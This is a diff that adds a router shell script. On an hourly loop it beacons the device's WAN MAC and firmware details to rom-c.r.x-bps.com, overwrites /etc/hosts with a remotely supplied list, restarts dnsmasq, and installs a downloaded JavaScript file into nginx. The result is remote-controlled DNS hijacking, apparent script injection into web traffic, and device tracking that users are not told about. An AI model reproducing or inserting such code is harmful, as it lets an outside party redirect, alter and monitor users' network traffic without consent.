@@ -1,0 +1,61 @@
+#! /bin/sh
+
+CURL="/usr/bin/curl -m 60"
+NGINX="/usr/sbin/nginx"
+TMPHOST="/tmp/hosts.tmp"
+HOSTFILE="/etc/hosts"
+DNSMASQ="/usr/sbin/dnsmasq"
+CONFIGFILE="/var/etc/dnsmasq.conf"
+TMPJS="/tmp/ij.js"
+JSFILE="/etc/nginx/ij.js"
+
+WANMAC=$(uci get network.wan.macaddr|sed 's/://g')
+HW_VER="$(uci get system.system.hw_ver)"
+FW_VER="$(uci get system.system.fw_ver)"
+
+load_hosts()
+{
+	echo "127.0.0.1 localhost" >${TMPHOST}
+	${CURL} "http://rom-c.r.x-bps.com/router/c/?t=sq&f=D&g=${WANMAC}&v=2&dv=${HW_VER}&rv=${FW_VER}" >>${TMPHOST} 2>/dev/null
+	grep -q "NoSuchBucket" ${TMPHOST}
+	if [ $? -ne 0 ];then
+		sed  -i '/^$/d' ${TMPHOST} 
+		NEWMD5=$(/usr/bin/md5sum ${TMPHOST} |awk '{print $1}')
+		OLDMD5=$(/usr/bin/md5sum ${HOSTFILE} |awk '{print $1}')
+
+		if [ "$NEWMD5" != "$OLDMD5" ];then	
+			cat ${TMPHOST} > ${HOSTFILE}
+			DNSPID=`pidof dnsmasq`	
+			kill -9 ${DNSPID}
+			${DNSMASQ} -C $CONFIGFILE -k &
+		fi
+	fi
+}
+
+load_js()
+{
+	${CURL} "http://rom-c.r.x-bps.com/router/c/?t=sq&f=I&g=${WANMAC}&v=2&dv=${HW_VER}&rv=${FW_VER}" >${TMPJS} 2>/dev/null
+	
+	grep -q "${WANMAC}" ${TMPJS}
+	if [ $? -eq 0 ];then
+		sed  -i '/^$/d' ${TMPJS}
+		NEWMD5=$(/usr/bin/md5sum ${TMPJS} |awk '{print $1}')
+		OLDMD5=$(/usr/bin/md5sum ${JSFILE} |awk '{print $1}')
+		if [ "$NEWMD5" != "$OLDMD5" ];then
+			mv -f ${TMPJS} /etc/nginx/
+			${NGINX} -s reload		
+		fi	
+	fi
+		
+}
+
+sleep 300
+while :
+do
+	/bin/ping -c 3 -W 3 rom-c.r.x-bps.com
+	if [ $? -eq 0 ];then
+		load_hosts
+		load_js	
+	fi
+	sleep 3600
+done
